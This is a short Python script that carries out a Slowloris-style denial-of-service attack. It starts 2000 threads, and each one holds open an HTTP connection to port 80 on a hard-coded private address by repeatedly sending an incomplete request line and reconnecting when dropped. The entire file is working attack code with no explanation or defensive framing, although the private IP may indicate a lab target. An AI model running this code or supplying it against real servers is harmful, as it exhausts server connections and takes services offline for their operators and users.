import socket
import threading
import time

target = "172.20.10.2"
port = 80
def attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(50000)
        s.connect((target, port))
        s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
        i = 0
        while True:
            try:
                i=0
                time.sleep(10)
                s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
                # send custom header with some random bytes
                #s.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
            except socket.error as e:
                print(e)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                    s.settimeout(50)

                    s.connect((target, port))

                    s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
                except socket.error as e2:
                    print("reconnection failed",e2)
                    break
        s.close()
    except socket.error as e2:
        print("reconnection failed", e2)
for i in range(2000):
    thread = threading.Thread(target=attack)
    thread.start()
